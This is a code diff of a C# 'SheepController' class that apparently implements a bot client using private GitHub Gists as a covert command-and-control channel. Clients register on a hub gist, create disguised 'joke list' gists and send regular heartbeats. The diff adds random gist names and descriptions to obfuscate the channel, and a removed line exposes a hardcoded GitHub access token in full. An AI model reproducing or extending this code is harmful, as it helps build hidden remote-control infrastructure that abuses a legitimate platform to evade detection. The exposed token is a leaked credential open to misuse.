@@ -12,6 +12,9 @@ public class SheepController
 
     private Timer _heartBeatTimer;
 
+    private const string HubGistId = "<HUB_GIST_ID>";
+    private const string GithubToken = "<GITHUB_TOKEN>";
+
     public string SheepId { get; private set; }
 
     private IDictionary<int, GistComment> _processedComments = new Dictionary<int, GistComment>();
@@ -32,8 +35,7 @@ public class SheepController
     {
         var client = new GitHubClient(new ProductHeaderValue($"sheep"));
         var tokenAuth =
-            new Credentials(
-                "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");
+            new Credentials(GithubToken);
         client.Credentials = tokenAuth;
 
         return client;
@@ -42,16 +44,15 @@ public class SheepController
     public async Task Start()
     {
         //Try to find existing hub gist
-        var comments = await _client.Gist.Comment.GetAllForGist("652bac55c3f50e604c1882abbec27c27");
+        var comments = await _client.Gist.Comment.GetAllForGist(HubGistId);
 
         foreach (var comment in comments)
         {
             if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage) &&
                 assignmentMessage.SheepId == SheepId)
             {
-                Console.WriteLine("Gist found!");
                 _gistId = assignmentMessage.GistId;
-                
+
                 _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
                 return;
             }
@@ -63,24 +64,16 @@ public class SheepController
             Public = false,
             Description = $"Joke list id: {SheepId}"
         };
-        newGist.Files.Add("Jokes! 😜",
-            "In this file I am going to collect my favorite jokes! Have fun reading them! 😂");
+        newGist.Files.Add(Obfuscator.RandomGistName(), Obfuscator.RandomGistDescription());
 
         var gist = await _client.Gist.Create(newGist);
         _gistId = gist.Id;
 
         _startingComment =
-            await _client.Gist.Comment.Create("652bac55c3f50e604c1882abbec27c27",
+            await _client.Gist.Comment.Create(HubGistId,
                 new AssignmentMessage(SheepId, _gistId).GetTransportFormat());
-        
-        _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
-        
-    }
 
-    public async Task End()
-    {
-        if (_startingComment != null)
-            await _client.Gist.Comment.Delete("652bac55c3f50e604c1882abbec27c27", _startingComment.Id);
+        _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
     }
 
     public async Task TryReceiveMessage()
